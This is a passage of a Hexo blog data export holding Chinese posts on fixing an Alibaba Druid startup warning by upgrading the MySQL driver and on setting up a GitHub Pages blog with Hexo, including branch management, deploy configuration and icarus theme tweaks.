href=\"https://github.com/alibaba/druid/wiki/&#x5E38;&#x89C1;&#x95EE;&#x9898;\">https://github.com/alibaba/druid/wiki/&#x5E38;&#x89C1;&#x95EE;&#x9898;</a><br>&#x963F;&#x91CC;&#x5DF4;&#x5DF4;&#x5F00;&#x6E90;&#x9879;&#x76EE;Druid&#x8D1F;&#x8D23;&#x4EBA;&#x6E29;&#x5C11;&#x8BBF;&#x8C08;&#xFF1A;<a href=\"http://www.iteye.com/magazines/90\">http://www.iteye.com/magazines/90</a><br>&#x914D;&#x7F6E;&#x65B9;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;<a href=\"http://blog.csdn.net/pk490525/article/details/12621649\">http://blog.csdn.net/pk490525/article/details/12621649</a>  </p>\n<h3 id=\"&#x95EE;&#x9898;\"><a href=\"#&#x95EE;&#x9898;\" class=\"headerlink\" title=\"&#x95EE;&#x9898;\"></a>&#x95EE;&#x9898;</h3><p><strong>&#x5B9E;&#x8DF5;&#x9047;&#x5230;&#x7684;&#x95EE;&#x9898;</strong>&#xFF1A;&#x5B98;&#x7F51;&#x4E0B;&#x8F7D; druid-1.0.17.jar&#xFF0C;&#x5F15;&#x5165;&#x5E76;&#x914D;&#x7F6E;&#x597D;&#x76F8;&#x5173;&#x6587;&#x4EF6;&#x540E;&#xFF0C;&#x542F;&#x52A8;&#x62A5;&#x4E86;&#x4E00;&#x4E2A;&#x8B66;&#x544A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Druid/1.png\" alt=\"&#x56FE;&#x7247;1\"></p>\n<p><strong>&#x67E5;&#x770B;&#x6E90;&#x7801;&#x5982;&#x4E0B;</strong>&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Druid/2.png\" alt=\"&#x56FE;&#x7247;2\"></p>\n<p><strong>&#x539F;&#x56E0;</strong>&#xFF1A;&#x5E94;&#x8BE5;&#x662F;mysql&#x9A71;&#x52A8;&#x592A;&#x8001;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x4E0B;&#x8F7D;&#x7684;druid-1.0.17.jar&#x662F;16&#x5E74;&#x6700;&#x65B0;&#x53D1;&#x5E03;&#x7684;&#xFF0C;&#x53BB;mysql&#x5B98;&#x7F51;&#x4E0B;&#x8F7D;&#x6700;&#x65B0;jar&#x5305;&#x540E;&#xFF0C;&#x95EE;&#x9898;&#x89E3;&#x51B3;</p>\n<h3 id=\"&#x8FD0;&#x884C;&#x7ED3;&#x679C;\"><a href=\"#&#x8FD0;&#x884C;&#x7ED3;&#x679C;\" class=\"headerlink\" title=\"&#x8FD0;&#x884C;&#x7ED3;&#x679C;\"></a>&#x8FD0;&#x884C;&#x7ED3;&#x679C;</h3><p>&#x542F;&#x52A8;&#x540E;&#x9879;&#x76EE;&#xFF0C;<a href=\"http://localhost:8080/ichargerclouds/druid/index.html\">http://localhost:8080/ichargerclouds/druid/index.html</a><br>&#x76D1;&#x63A7;&#x9875;&#x9762;&#x8FD0;&#x884C;&#x5982;&#x4E0B;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Druid/3.png\" alt=\"&#x56FE;&#x7247;3\"></p>\n"},{"title":"Github+Hexo,搭建专属网站","date":"2016-06-01T14:22:00.000Z","toc":false,"_content":"\n### 前言\n记得从大二开始，就一直想搭个专属网站，当时使劲抠页面【前端页面是从QQ空间抠的，现在想抠估计没这么容易了】，写代码，忙活半天才把程序弄好。\n\n![个人网站](http://7xvfir.com1.z0.glb.clouddn.com/Github+Hexo,%E6%90%AD%E5%BB%BA%E4%B8%93%E6%9C%89%E5%8D%9A%E5%AE%A2/2.png)\n\n可惜最终项目还是没上线，因为当时有两问题绕不开\n- 需要购买服务器【服务器太贵，现在便宜的阿里云服务器每月都需100左右】。\n- 需要运维管理【麻烦且危险，服务器宕了可能丢失数据】。\n\n最近了解到 github + hexo 能完美解决上述问题，啥也不说了，直接开干 ^.^\n\n---\n\n### 相关网站\n搭建教程网上比比皆是，此处不累赘，下面是搭建过程中用到的相关网站：\n\nhexo中文网站：[https://hexo.io/zh-cn/docs/](https://hexo.io/zh-cn/docs/)  \nhexo主题模板：[https://www.zhihu.com/question/24422335](https://www.zhihu.com/question/24422335)\nhexo+github搭建过程：[http://www.jianshu.com/p/df3edc4286d2](http://www.jianshu.com/p/df3edc4286d2)\nMarkdown 语法说明：[http://www.appinn.com/markdown/](http://www.appinn.com/markdown/)\ngithub绑定域名：[http://www.jianshu.com/p/1d427e888dda](http://www.jianshu.com/p/1d427e888dda)  \n\n---\n\n### HEXO如何优化部署及管理\n**问题：使用hexo时，如果本地文件丢失或者想在其他电脑上修改博客怎么办？**\n**方案：**简单地说，每个想建立GitHub Pages的仓库，至少两个分支，一个hexo分支用来存放网站的原始文件，一个master分支用来存放生成的静态网页。  \n\n<!-- more -->\n\n**步骤如下:**\n1、创建仓库，Wasim37.github.io；\n2、创建两个分支：master 与 hexo；\n3、设置hexo为默认分支（因为我们只需要手动管理这个分支上的Hexo网站文件）；\n4、使用git clone git@github.com:Wasim37/Wasim37.github.io.git拷贝仓库；\n5、在本地Wasim37.github.io文件夹下通过Git bash依次执行npm install hexo、hexo init、npm install 和 npm install hexo-deployer-git（此时当前分支应显示为hexo）;\n6、修改_config.yml中的deploy参数，分支应为master；\n7、依次执行git add .、git commit -m “…”、git push origin hexo提交网站相关的文件；\n8、执行hexo generate -d生成网站并部署到GitHub上。\n\n**本地修改**\n1、在本地对博客进行修改（添加新博文、修改样式等等）后，通过下面的流程进行管理：\n依次执行git add .、git commit -m “…”、git push origin hexo指令将改动推送到GitHub（此时当前分支应为hexo）；\n2、然后才执行hexo generate -d发布网站到master分支上。\n\n**本地资料丢失或者想在其他电脑上修改博客**\n1、使用git clone git@github.com:Wasim37/Wasim37.github.io.git拷贝仓库（默认分支为hexo）；\n2、在本地新拷贝的Wasim37.github.io文件夹下通过Git bash依次执行下列指令：npm install hexo、npm install、npm install hexo-deployer-git（记得，不需要hexo init这条指令）。\n\n---\n\n### 安装错误记录\n执行hexo d出现以下错误\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/Github+Hexo,%E6%90%AD%E5%BB%BA%E4%B8%93%E6%9C%89%E5%8D%9A%E5%AE%A2/4.png)\n\n**解决方法：**\n_config.yml ——> deploy ——> repository\nhttps://github.com/{username}/{username}.github.io.git 修改为\ngit@github.com:{username}/{username}.github.io.git\n\n---\n\n### 文章编辑工具\n文章编辑工具一开始我使用的是subline，但因为没有快捷键及预览功能，后来选择了MarkdownPad。可最近发现新版的有道云笔记支持Markdown语法，果断换成了有道。\n**因为有道除了编辑功能，我更看重的是它对文章的二次备份.** \n\n有道云笔记MarkDown使用教程： [http://note.youdao.com/iyoudao/?p=1895](http://note.youdao.com/iyoudao/?p=1895)\n\n![效果图](http://7xvfir.com1.z0.glb.clouddn.com/Github+Hexo,%E6%90%AD%E5%BB%BA%E4%B8%93%E6%9C%89%E5%8D%9A%E5%AE%A2/1.png)\n\n**其次文章图片如果不想托管在github，可以使用七牛云存储等图床工具。**\n\n---\n\n### 模板自定义\n我使用的博客主题为 **icarus**，对比可以发现，我在展示细节上做了一些自己的修改。\n\n比如页面展示可以分为左中右三个区域，分别为profile-column，main-column和sidebar-column。\n源代码三者宽度比例为3:7:3。为了突出正文，我改为了 2.3：8.4：2.3。\n源代码文件位置为：icarus\\source\\css\\_variables.styl\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/Github+Hexo,%E6%90%AD%E5%BB%BA%E4%B8%93%E6%9C%89%E5%8D%9A%E5%AE%A2/3.png)\n\n---\n\n### 文章目录\nicarus主题模板的文章详细展示默认是不带有文章目录的\n如果需要添加文章目录，可以参考http://www.jianshu.com/p/72408c410904\n\nicarus主题添加文章目录，修改themes\\icarus\\layout\\common\\article.ejs文件即可。\n```bash\n<% if (!index && post.toc) { %>\n修改为\n<% if (!index && post.toc != false) { %>\n```\n\n每篇文章可以选择是否开放目录功能\n```bash\n...\ntitle: Github+Hexo,搭建专属网站\ncategories:\n  - demo\ntoc: false\n...\n```","source":"_posts/Github+Hexo,搭建专有博客.md","raw":"---\ntitle: Github+Hexo,搭建专属网站\ntags:\n  - github\n  - hexo\ncategories:\n  - 运维部署\ndate: 2016-6-1 22:22:00\ntoc: false\n\n---\n\n### 前言\n记得从大二开始，就一直想搭个专属网站，当时使劲抠页面【前端页面是从QQ空间抠的，现在想抠估计没这么容易了】，写代码，忙活半天才把程序弄好。\n\n![个人网站](http://7xvfir.com1.z0.glb.clouddn.com/Github+Hexo,%E6%90%AD%E5%BB%BA%E4%B8%93%E6%9C%89%E5%8D%9A%E5%AE%A2/2.png)\n\n可惜最终项目还是没上线，因为当时有两问题绕不开\n- 需要购买服务器【服务器太贵，现在便宜的阿里云服务器每月都需100左右】。\n- 需要运维管理【麻烦且危险，服务器宕了可能丢失数据】。\n\n最近了解到 github + hexo 能完美解决上述问题，啥也不说了，直接开干 ^.^\n\n---\n\n### 相关网站\n搭建教程网上比比皆是，此处不累赘，下面是搭建过程中用到的相关网站：\n\nhexo中文网站：[https://hexo.io/zh-cn/docs/](https://hexo.io/zh-cn/docs/)  \nhexo主题模板：[https://www.zhihu.com/question/24422335](https://www.zhihu.com/question/24422335)\nhexo+github搭建过程：[http://www.jianshu.com/p/df3edc4286d2](http://www.jianshu.com/p/df3edc4286d2)\nMarkdown 语法说明：[http://www.appinn.com/markdown/](http://www.appinn.com/markdown/)\ngithub绑定域名：[http://www.jianshu.com/p/1d427e888dda](http://www.jianshu.com/p/1d427e888dda)  \n\n---\n\n### HEXO如何优化部署及管理\n**问题：使用hexo时，如果本地文件丢失或者想在其他电脑上修改博客怎么办？**\n**方案：**简单地说，每个想建立GitHub Pages的仓库，至少两个分支，一个hexo分支用来存放网站的原始文件，一个master分支用来存放生成的静态网页。  \n\n<!-- more -->\n\n**步骤如下:**\n1、创建仓库，Wasim37.github.io；\n2、创建两个分支：master 与 hexo；\n3、设置hexo为默认分支（因为我们只需要手动管理这个分支上的Hexo网站文件）；\n4、使用git clone git@github.com:Wasim37/Wasim37.github.io.git拷贝仓库；\n5、在本地Wasim37.github.io文件夹下通过Git bash依次执行npm install hexo、hexo init、npm install 和 npm install hexo-deployer-git（此时当前分支应显示为hexo）;\n6、修改_config.yml中的deploy参数，分支应为master；\n7、依次执行git add .、git commit -m “…”、git push origin hexo提交网站相关的文件；\n8、执行hexo generate -d生成网站并部署到GitHub上。\n\n**本地修改**\n1、在本地对博客进行修改（添加新博文、修改样式等等）后，通过下面的流程进行管理：\n依次执行git add .、git commit -m “…”、git push origin hexo指令将改动推送到GitHub（此时当前分支应为hexo）；\n2、然后才执行hexo generate -d发布网站到master分支上。\n\n**本地资料丢失或者想在其他电脑上修改博客**\n1、使用git clone git@github.com:Wasim37/Wasim37.github.io.git拷贝仓库（默认分支为hexo）；\n2、在本地新拷贝的Wasim37.github.io文件夹下通过Git bash依次执行下列指令：npm install hexo、npm install、npm install hexo-deployer-git（记得，不需要hexo init这条指令）。\n\n---\n\n### 安装错误记录\n执行hexo d出现以下错误\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/Github+Hexo,%E6%90%AD%E5%BB%BA%E4%B8%93%E6%9C%89%E5%8D%9A%E5%AE%A2/4.png)\n\n**解决方法：**\n_config.yml ——> deploy ——> repository\nhttps://github.com/{username}/{username}.github.io.git 修改为\ngit@github.com:{username}/{username}.github.io.git\n\n---\n\n### 文章编辑工具\n文章编辑工具一开始我使用的是subline，但因为没有快捷键及预览功能，后来选择了MarkdownPad。可最近发现新版的有道云笔记支持Markdown语法，果断换成了有道。\n**因为有道除了编辑功能，我更看重的是它对文章的二次备份.** \n\n有道云笔记MarkDown使用教程： [http://note.youdao.com/iyoudao/?p=1895](http://note.youdao.com/iyoudao/?p=1895)\n\n![效果图](http://7xvfir.com1.z0.glb.clouddn.com/Github+Hexo,%E6%90%AD%E5%BB%BA%E4%B8%93%E6%9C%89%E5%8D%9A%E5%AE%A2/1.png)\n\n**其次文章图片如果不想托管在github，可以使用七牛云存储等图床工具。**\n\n---\n\n### 模板自定义\n我使用的博客主题为 **icarus**，对比可以发现，我在展示细节上做了一些自己的修改。\n\n比如页面展示可以分为左中右三个区域，分别为profile-column，main-column和sidebar-column。\n源代码三者宽度比例为3:7:3。为了突出正文，我改为了 2.3：8.4：2.3。\n源代码文件位置为：icarus\\source\\css\\_variables.styl\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/Github+Hexo,%E6%90%AD%E5%BB%BA%E4%B8%93%E6%9C%89%E5%8D%9A%E5%AE%A2/3.png)\n\n---\n\n### 文章目录\nicarus主题模板的文章详细展示默认是不带有文章目录的\n如果需要添加文章目录，可以参考http://www.jianshu.com/p/72408c410904\n\nicarus主题添加文章目录，修改themes\\icarus\\layout\\common\\article.ejs文件即可。\n```bash\n<% if (!index && post.toc) { %>\n修改为\n<% if (!index && post.toc != false) { %>\n```\n\n每篇文章可以选择是否开放目录功能\n```bash\n...\ntitle: Github+Hexo,搭建专属网站\ncategories:\n  - demo\ntoc: false\n...\n```","slug":"Github+Hexo,搭建专有博客","published":1,"updated":"2016-11-18T01:17:04.151Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulaq000ggwtmkbjq7otk","content":"<h3 id=\"&#x524D;&#x8A00;\"><a href=\"#&#x524D;&#x8A00;\" class=\"headerlink\" title=\"&#x524D;&#x8A00;\"></a>&#x524D;&#x8A00;</h3><p>&#x8BB0;&#x5F97;&#x4ECE;&#x5927;&#x4E8C;&#x5F00;&#x59CB;&#xFF0C;&#x5C31;&#x4E00;&#x76F4;&#x60F3;&#x642D;&#x4E2A;&#x4E13;&#x5C5E;&#x7F51;&#x7AD9;&#xFF0C;&#x5F53;&#x65F6;&#x4F7F;&#x52B2;&#x62A0;&#x9875;&#x9762;&#x3010;&#x524D;&#x7AEF;&#x9875;&#x9762;&#x662F;&#x4ECE;QQ&#x7A7A;&#x95F4;&#x62A0;&#x7684;&#xFF0C;&#x73B0;&#x5728;&#x60F3;&#x62A0;&#x4F30;&#x8BA1;&#x6CA1;&#x8FD9;&#x4E48;&#x5BB9;&#x6613;&#x4E86;&#x3011;&#xFF0C;&#x5199;&#x4EE3;&#x7801;&#xFF0C;&#x5FD9;&#x6D3B;&#x534A;&#x5929;&#x624D;&#x628A;&#x7A0B;&#x5E8F;&#x5F04;&#x597D;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Github+Hexo,%E6%90%AD%E5%BB%BA%E4%B8%93%E6%9C%89%E5%8D%9A%E5%AE%A2/2.png\" alt=\"&#x4E2A;&#x4EBA;&#x7F51;&#x7AD9;\"></p>\n<p>&#x53EF;&#x60DC;&#x6700;&#x7EC8;&#x9879;&#x76EE;&#x8FD8;&#x662F;&#x6CA1;&#x4E0A;&#x7EBF;&#xFF0C;&#x56E0;&#x4E3A;&#x5F53;&#x65F6;&#x6709;&#x4E24;&#x95EE;&#x9898;&#x7ED5;&#x4E0D;&#x5F00;</p>\n<ul>\n<li>&#x9700;&#x8981;&#x8D2D;&#x4E70;&#x670D;&#x52A1;&#x5668;&#x3010;&#x670D;&#x52A1;&#x5668;&#x592A;&#x8D35;&#xFF0C;&#x73B0;&#x5728;&#x4FBF;&#x5B9C;&#x7684;&#x963F;&#x91CC;&#x4E91;&#x670D;&#x52A1;&#x5668;&#x6BCF;&#x6708;&#x90FD;&#x9700;100&#x5DE6;&#x53F3;&#x3011;&#x3002;</li>\n<li>&#x9700;&#x8981;&#x8FD0;&#x7EF4;&#x7BA1;&#x7406;&#x3010;&#x9EBB;&#x70E6;&#x4E14;&#x5371;&#x9669;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x4E86;&#x53EF;&#x80FD;&#x4E22;&#x5931;&#x6570;&#x636E;&#x3011;&#x3002;</li>\n</ul>\n<p>&#x6700;&#x8FD1;&#x4E86;&#x89E3;&#x5230; github + hexo &#x80FD;&#x5B8C;&#x7F8E;&#x89E3;&#x51B3;&#x4E0A;&#x8FF0;&#x95EE;&#x9898;&#xFF0C;&#x5565;&#x4E5F;&#x4E0D;&#x8BF4;&#x4E86;&#xFF0C;&#x76F4;&#x63A5;&#x5F00;&#x5E72; ^.^</p>\n<hr>\n<h3 id=\"&#x76F8;&#x5173;&#x7F51;&#x7AD9;\"><a href=\"#&#x76F8;&#x5173;&#x7F51;&#x7AD9;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x7F51;&#x7AD9;\"></a>&#x76F8;&#x5173;&#x7F51;&#x7AD9;</h3><p>&#x642D;&#x5EFA;&#x6559;&#x7A0B;&#x7F51;&#x4E0A;&#x6BD4;&#x6BD4;&#x7686;&#x662F;&#xFF0C;&#x6B64;&#x5904;&#x4E0D;&#x7D2F;&#x8D58;&#xFF0C;&#x4E0B;&#x9762;&#x662F;&#x642D;&#x5EFA;&#x8FC7;&#x7A0B;&#x4E2D;&#x7528;&#x5230;&#x7684;&#x76F8;&#x5173;&#x7F51;&#x7AD9;&#xFF1A;</p>\n<p>hexo&#x4E2D;&#x6587;&#x7F51;&#x7AD9;&#xFF1A;<a href=\"https://hexo.io/zh-cn/docs/\" target=\"_blank\" rel=\"external\">https://hexo.io/zh-cn/docs/</a><br>hexo&#x4E3B;&#x9898;&#x6A21;&#x677F;&#xFF1A;<a href=\"https://www.zhihu.com/question/24422335\" target=\"_blank\" rel=\"external\">https://www.zhihu.com/question/24422335</a><br>hexo+github&#x642D;&#x5EFA;&#x8FC7;&#x7A0B;&#xFF1A;<a href=\"http://www.jianshu.com/p/df3edc4286d2\" target=\"_blank\" rel=\"external\">http://www.jianshu.com/p/df3edc4286d2</a><br>Markdown &#x8BED;&#x6CD5;&#x8BF4;&#x660E;&#xFF1A;<a href=\"http://www.appinn.com/markdown/\" target=\"_blank\" rel=\"external\">http://www.appinn.com/markdown/</a><br>github&#x7ED1;&#x5B9A;&#x57DF;&#x540D;&#xFF1A;<a href=\"http://www.jianshu.com/p/1d427e888dda\" target=\"_blank\" rel=\"external\">http://www.jianshu.com/p/1d427e888dda</a>  </p>\n<hr>\n<h3 id=\"HEXO&#x5982;&#x4F55;&#x4F18;&#x5316;&#x90E8;&#x7F72;&#x53CA;&#x7BA1;&#x7406;\"><a href=\"#HEXO&#x5982;&#x4F55;&#x4F18;&#x5316;&#x90E8;&#x7F72;&#x53CA;&#x7BA1;&#x7406;\" class=\"headerlink\" title=\"HEXO&#x5982;&#x4F55;&#x4F18;&#x5316;&#x90E8;&#x7F72;&#x53CA;&#x7BA1;&#x7406;\"></a>HEXO&#x5982;&#x4F55;&#x4F18;&#x5316;&#x90E8;&#x7F72;&#x53CA;&#x7BA1;&#x7406;</h3><p><strong>&#x95EE;&#x9898;&#xFF1A;&#x4F7F;&#x7528;hexo&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x4E22;&#x5931;&#x6216;&#x8005;&#x60F3;&#x5728;&#x5176;&#x4ED6;&#x7535;&#x8111;&#x4E0A;&#x4FEE;&#x6539;&#x535A;&#x5BA2;&#x600E;&#x4E48;&#x529E;&#xFF1F;</strong><br><strong>&#x65B9;&#x6848;&#xFF1A;</strong>&#x7B80;&#x5355;&#x5730;&#x8BF4;&#xFF0C;&#x6BCF;&#x4E2A;&#x60F3;&#x5EFA;&#x7ACB;GitHub Pages&#x7684;&#x4ED3;&#x5E93;&#xFF0C;&#x81F3;&#x5C11;&#x4E24;&#x4E2A;&#x5206;&#x652F;&#xFF0C;&#x4E00;&#x4E2A;hexo&#x5206;&#x652F;&#x7528;&#x6765;&#x5B58;&#x653E;&#x7F51;&#x7AD9;&#x7684;&#x539F;&#x59CB;&#x6587;&#x4EF6;&#xFF0C;&#x4E00;&#x4E2A;master&#x5206;&#x652F;&#x7528;&#x6765;&#x5B58;&#x653E;&#x751F;&#x6210;&#x7684;&#x9759;&#x6001;&#x7F51;&#x9875;&#x3002;  </p>\n<a id=\"more\"></a>\n<p><strong>&#x6B65;&#x9AA4;&#x5982;&#x4E0B;:</strong><br>1&#x3001;&#x521B;&#x5EFA;&#x4ED3;&#x5E93;&#xFF0C;Wasim37.github.io&#xFF1B;<br>2&#x3001;&#x521B;&#x5EFA;&#x4E24;&#x4E2A;&#x5206;&#x652F;&#xFF1A;master &#x4E0E; hexo&#xFF1B;<br>3&#x3001;&#x8BBE;&#x7F6E;hexo&#x4E3A;&#x9ED8;&#x8BA4;&#x5206;&#x652F;&#xFF08;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x624B;&#x52A8;&#x7BA1;&#x7406;&#x8FD9;&#x4E2A;&#x5206;&#x652F;&#x4E0A;&#x7684;Hexo&#x7F51;&#x7AD9;&#x6587;&#x4EF6;&#xFF09;&#xFF1B;<br>4&#x3001;&#x4F7F;&#x7528;git clone git@github.com:Wasim37/Wasim37.github.io.git&#x62F7;&#x8D1D;&#x4ED3;&#x5E93;&#xFF1B;<br>5&#x3001;&#x5728;&#x672C;&#x5730;Wasim37.github.io&#x6587;&#x4EF6;&#x5939;&#x4E0B;&#x901A;&#x8FC7;Git bash&#x4F9D;&#x6B21;&#x6267;&#x884C;npm install hexo&#x3001;hexo init&#x3001;npm install &#x548C; npm install hexo-deployer-git&#xFF08;&#x6B64;&#x65F6;&#x5F53;&#x524D;&#x5206;&#x652F;&#x5E94;&#x663E;&#x793A;&#x4E3A;hexo&#xFF09;;<br>6&#x3001;&#x4FEE;&#x6539;_config.yml&#x4E2D;&#x7684;deploy&#x53C2;&#x6570;&#xFF0C;&#x5206;&#x652F;&#x5E94;&#x4E3A;master&#xFF1B;<br>7&#x3001;&#x4F9D;&#x6B21;&#x6267;&#x884C;git add .&#x3001;git commit -m &#x201C;&#x2026;&#x201D;&#x3001;git push origin hexo&#x63D0;&#x4EA4;&#x7F51;&#x7AD9;&#x76F8;&#x5173;&#x7684;&#x6587;&#x4EF6;&#xFF1B;<br>8&#x3001;&#x6267;&#x884C;hexo generate -d&#x751F;&#x6210;&#x7F51;&#x7AD9;&#x5E76;&#x90E8;&#x7F72;&#x5230;GitHub&#x4E0A;&#x3002;</p>\n<p><strong>&#x672C;&#x5730;&#x4FEE;&#x6539;</strong><br>1&#x3001;&#x5728;&#x672C;&#x5730;&#x5BF9;&#x535A;&#x5BA2;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#xFF08;&#x6DFB;&#x52A0;&#x65B0;&#x535A;&#x6587;&#x3001;&#x4FEE;&#x6539;&#x6837;&#x5F0F;&#x7B49;&#x7B49;&#xFF09;&#x540E;&#xFF0C;&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x7684;&#x6D41;&#x7A0B;&#x8FDB;&#x884C;&#x7BA1;&#x7406;&#xFF1A;<br>&#x4F9D;&#x6B21;&#x6267;&#x884C;git add .&#x3001;git commit -m &#x201C;&#x2026;&#x201D;&#x3001;git push origin hexo&#x6307;&#x4EE4;&#x5C06;&#x6539;&#x52A8;&#x63A8;&#x9001;&#x5230;GitHub&#xFF08;&#x6B64;&#x65F6;&#x5F53;&#x524D;&#x5206;&#x652F;&#x5E94;&#x4E3A;hexo&#xFF09;&#xFF1B;<br>2&#x3001;&#x7136;&#x540E;&#x624D;&#x6267;&#x884C;hexo generate -d&#x53D1;&#x5E03;&#x7F51;&#x7AD9;&#x5230;master&#x5206;&#x652F;&#x4E0A;&#x3002;</p>\n<p><strong>&#x672C;&#x5730;&#x8D44;&#x6599;&#x4E22;&#x5931;&#x6216;&#x8005;&#x60F3;&#x5728;&#x5176;&#x4ED6;&#x7535;&#x8111;&#x4E0A;&#x4FEE;&#x6539;&#x535A;&#x5BA2;</strong><br>1&#x3001;&#x4F7F;&#x7528;git clone git@github.com:Wasim37/Wasim37.github.io.git&#x62F7;&#x8D1D;&#x4ED3;&#x5E93;&#xFF08;&#x9ED8;&#x8BA4;&#x5206;&#x652F;&#x4E3A;hexo&#xFF09;&#xFF1B;<br>2&#x3001;&#x5728;&#x672C;&#x5730;&#x65B0;&#x62F7;&#x8D1D;&#x7684;Wasim37.github.io&#x6587;&#x4EF6;&#x5939;&#x4E0B;&#x901A;&#x8FC7;Git bash&#x4F9D;&#x6B21;&#x6267;&#x884C;&#x4E0B;&#x5217;&#x6307;&#x4EE4;&#xFF1A;npm install hexo&#x3001;npm install&#x3001;npm install hexo-deployer-git&#xFF08;&#x8BB0;&#x5F97;&#xFF0C;&#x4E0D;&#x9700;&#x8981;hexo init&#x8FD9;&#x6761;&#x6307;&#x4EE4;&#xFF09;&#x3002;</p>\n<hr>\n<h3 id=\"&#x5B89;&#x88C5;&#x9519;&#x8BEF;&#x8BB0;&#x5F55;\"><a href=\"#&#x5B89;&#x88C5;&#x9519;&#x8BEF;&#x8BB0;&#x5F55;\" class=\"headerlink\" title=\"&#x5B89;&#x88C5;&#x9519;&#x8BEF;&#x8BB0;&#x5F55;\"></a>&#x5B89;&#x88C5;&#x9519;&#x8BEF;&#x8BB0;&#x5F55;</h3><p>&#x6267;&#x884C;hexo d&#x51FA;&#x73B0;&#x4EE5;&#x4E0B;&#x9519;&#x8BEF;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Github+Hexo,%E6%90%AD%E5%BB%BA%E4%B8%93%E6%9C%89%E5%8D%9A%E5%AE%A2/4.png\" alt=\"\"></p>\n<p><strong>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;</strong><br>_config.yml &#x2014;&#x2014;&gt; deploy &#x2014;&#x2014;&gt; repository<br><a href=\"https://github.com/{username}/{username}.github.io.git\" target=\"_blank\" rel=\"external\">https://github.com/{username}/{username}.github.io.git</a> &#x4FEE;&#x6539;&#x4E3A;<br>git@github.com:{username}/{username}.github.io.git</p>\n<hr>\n<h3 id=\"&#x6587;&#x7AE0;&#x7F16;&#x8F91;&#x5DE5;&#x5177;\"><a href=\"#&#x6587;&#x7AE0;&#x7F16;&#x8F91;&#x5DE5;&#x5177;\" class=\"headerlink\" title=\"&#x6587;&#x7AE0;&#x7F16;&#x8F91;&#x5DE5;&#x5177;\"></a>&#x6587;&#x7AE0;&#x7F16;&#x8F91;&#x5DE5;&#x5177;</h3><p>&#x6587;&#x7AE0;&#x7F16;&#x8F91;&#x5DE5;&#x5177;&#x4E00;&#x5F00;&#x59CB;&#x6211;&#x4F7F;&#x7528;&#x7684;&#x662F;subline&#xFF0C;&#x4F46;&#x56E0;&#x4E3A;&#x6CA1;&#x6709;&#x5FEB;&#x6377;&#x952E;&#x53CA;&#x9884;&#x89C8;&#x529F;&#x80FD;&#xFF0C;&#x540E;&#x6765;&#x9009;&#x62E9;&#x4E86;MarkdownPad&#x3002;&#x53EF;&#x6700;&#x8FD1;&#x53D1;&#x73B0;&#x65B0;&#x7248;&#x7684;&#x6709;&#x9053;&#x4E91;&#x7B14;&#x8BB0;&#x652F;&#x6301;Markdown&#x8BED;&#x6CD5;&#xFF0C;&#x679C;&#x65AD;&#x6362;&#x6210;&#x4E86;&#x6709;&#x9053;&#x3002;<br><strong>&#x56E0;&#x4E3A;&#x6709;&#x9053;&#x9664;&#x4E86;&#x7F16;&#x8F91;&#x529F;&#x80FD;&#xFF0C;&#x6211;&#x66F4;&#x770B;&#x91CD;&#x7684;&#x662F;&#x5B83;&#x5BF9;&#x6587;&#x7AE0;&#x7684;&#x4E8C;&#x6B21;&#x5907;&#x4EFD;.</strong> </p>\n<p>&#x6709;&#x9053;&#x4E91;&#x7B14;&#x8BB0;MarkDown&#x4F7F;&#x7528;&#x6559;&#x7A0B;&#xFF1A; <a href=\"http://note.youdao.com/iyoudao/?p=1895\" target=\"_blank\" rel=\"external\">http://note.youdao.com/iyoudao/?p=1895</a></p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Github+Hexo,%E6%90%AD%E5%BB%BA%E4%B8%93%E6%9C%89%E5%8D%9A%E5%AE%A2/1.png\" alt=\"&#x6548;&#x679C;&#x56FE;\"></p>\n<p><strong>&#x5176;&#x6B21;&#x6587;&#x7AE0;&#x56FE;&#x7247;&#x5982;&#x679C;&#x4E0D;&#x60F3;&#x6258;&#x7BA1;&#x5728;github&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E03;&#x725B;&#x4E91;&#x5B58;&#x50A8;&#x7B49;&#x56FE;&#x5E8A;&#x5DE5;&#x5177;&#x3002;</strong></p>\n<hr>\n<h3 id=\"&#x6A21;&#x677F;&#x81EA;&#x5B9A;&#x4E49;\"><a href=\"#&#x6A21;&#x677F;&#x81EA;&#x5B9A;&#x4E49;\" class=\"headerlink\" title=\"&#x6A21;&#x677F;&#x81EA;&#x5B9A;&#x4E49;\"></a>&#x6A21;&#x677F;&#x81EA;&#x5B9A;&#x4E49;</h3><p>&#x6211;&#x4F7F;&#x7528;&#x7684;&#x535A;&#x5BA2;&#x4E3B;&#x9898;&#x4E3A; 